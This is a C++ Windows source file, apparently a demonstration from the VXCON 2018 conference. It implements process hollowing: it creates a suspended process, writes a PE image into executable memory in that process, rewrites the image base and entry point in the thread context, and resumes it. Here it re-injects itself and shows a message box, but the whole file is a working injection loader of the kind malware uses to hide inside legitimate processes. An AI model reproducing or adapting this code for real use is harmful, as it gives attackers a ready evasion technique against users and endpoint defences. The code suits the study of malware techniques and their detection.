//#include <SDKDDKVer.h>
#include <stdio.h>
#include <tchar.h>
#include <Windows.h>
#include <winnt.h>
#include <fstream>
#include <Shlwapi.h>
#pragma comment (lib, "Shlwapi.lib")
EXTERN_C IMAGE_DOS_HEADER __ImageBase;
#define MILLISECONDS_TO_100NANOSECONDS(durationMs)      ((durationMs) * 1000 * 10)

#define GetHeaders(base) \
        ((PIMAGE_NT_HEADERS)((CONST LPBYTE)(base) + (base)->e_lfanew))

#define GetSubsystem(base) \
        ((GetHeaders((base)))->OptionalHeader.Subsystem)

HANDLE MapFileToMemory(LPCSTR filename)
{
	std::streampos size;
	std::fstream file(filename, std::ios::in | std::ios::binary | std::ios::ate);
	if (file.is_open())
	{
		size = file.tellg();

		char* Memblock = new char[size]();

		file.seekg(0, std::ios::beg);
		file.read(Memblock, size);
		file.close();

		return Memblock;
	}
	return 0;
}

void RunPortableExecutable(const char* path, void* Image)
{
    IMAGE_DOS_HEADER* DOSHeader;
    IMAGE_NT_HEADERS* NtHeader;
    IMAGE_SECTION_HEADER* SectionHeader;

    PROCESS_INFORMATION PI;
    STARTUPINFOA SI;

    CONTEXT CTX;

    LPVOID pImageBase;
    int count;

    DOSHeader = (PIMAGE_DOS_HEADER)Image;
    NtHeader = (PIMAGE_NT_HEADERS)((BYTE*)Image + DOSHeader->e_lfanew);

    if (NtHeader->Signature != IMAGE_NT_SIGNATURE)
        return;

    ZeroMemory(&PI, sizeof(PI));
    ZeroMemory(&SI, sizeof(SI));

    SI.cb = sizeof(SI);

    PWORD pwSub;
    if ((pwSub = &GetSubsystem((IMAGE_DOS_HEADER*)Image)))
        *pwSub = IMAGE_SUBSYSTEM_WINDOWS_GUI;

    if (!CreateProcessA(path, NULL, NULL, NULL, FALSE,
        CREATE_SUSPENDED, NULL, NULL, &SI, &PI))
        return;

    ZeroMemory(&CTX, sizeof(CTX));
    CTX.ContextFlags = CONTEXT_FULL;

    if (!GetThreadContext(PI.hThread, &CTX))
        return;

#ifdef _WIN64
    ULONGLONG imageBase = NtHeader->OptionalHeader.ImageBase;
#else
    DWORD imageBase = NtHeader->OptionalHeader.ImageBase;
#endif

    pImageBase = VirtualAllocEx(
        PI.hProcess,
        (LPVOID)imageBase,
        NtHeader->OptionalHeader.SizeOfImage,
        MEM_COMMIT | MEM_RESERVE,
        PAGE_EXECUTE_READWRITE
    );

    if (!pImageBase)
    {
        pImageBase = VirtualAllocEx(
            PI.hProcess,
            NULL,
            NtHeader->OptionalHeader.SizeOfImage,
            MEM_COMMIT | MEM_RESERVE,
            PAGE_EXECUTE_READWRITE
        );
    }

    WriteProcessMemory(
        PI.hProcess,
        pImageBase,
        Image,
        NtHeader->OptionalHeader.SizeOfHeaders,
        NULL
    );

    for (count = 0; count < NtHeader->FileHeader.NumberOfSections; count++)
    {
        SectionHeader = (PIMAGE_SECTION_HEADER)(
            (BYTE*)NtHeader +
            sizeof(IMAGE_NT_HEADERS) +
            IMAGE_SIZEOF_SECTION_HEADER * count
        );

        WriteProcessMemory(
            PI.hProcess,
            (LPVOID)((BYTE*)pImageBase + SectionHeader->VirtualAddress),
            (LPVOID)((BYTE*)Image + SectionHeader->PointerToRawData),
            SectionHeader->SizeOfRawData,
            NULL
        );
    }

#ifdef _WIN64

    ULONGLONG pebImageBase;
    ReadProcessMemory(
        PI.hProcess,
        (PVOID)(CTX.Rdx + 0x10),
        &pebImageBase,
        sizeof(pebImageBase),
        NULL
    );

    WriteProcessMemory(
        PI.hProcess,
        (PVOID)(CTX.Rdx + 0x10),
        &pImageBase,
        sizeof(pImageBase),
        NULL
    );

    CTX.Rcx = (ULONGLONG)pImageBase + NtHeader->OptionalHeader.AddressOfEntryPoint;

#else

    WriteProcessMemory(
        PI.hProcess,
        (LPVOID)(CTX.Ebx + 8),
        &pImageBase,
        sizeof(pImageBase),
        NULL
    );

    CTX.Eax = (DWORD)pImageBase + NtHeader->OptionalHeader.AddressOfEntryPoint;

#endif

    SetThreadContext(PI.hThread, &CTX);
    ResumeThread(PI.hThread);
}

int main()
{
	PIMAGE_NT_HEADERS hdrs;

	char CurrentFilePath[MAX_PATH + 1];
	GetModuleFileNameA(0, CurrentFilePath, MAX_PATH);

	if (hdrs = GetHeaders(&__ImageBase))
	{
		PWORD pwSub;

		if (pwSub = &GetSubsystem(&__ImageBase))
		{
			if (IMAGE_SUBSYSTEM_WINDOWS_GUI == (*pwSub))
			{
				MessageBoxA(0, "I'm notepad :P", "VXCON 2018", 0);
			}
			else
			{
				FreeConsole();

				//SleepEx(TRUE, 1);
				RunPortableExecutable(CurrentFilePath, MapFileToMemory(CurrentFilePath));
			}
		}
	}

	return 0;
}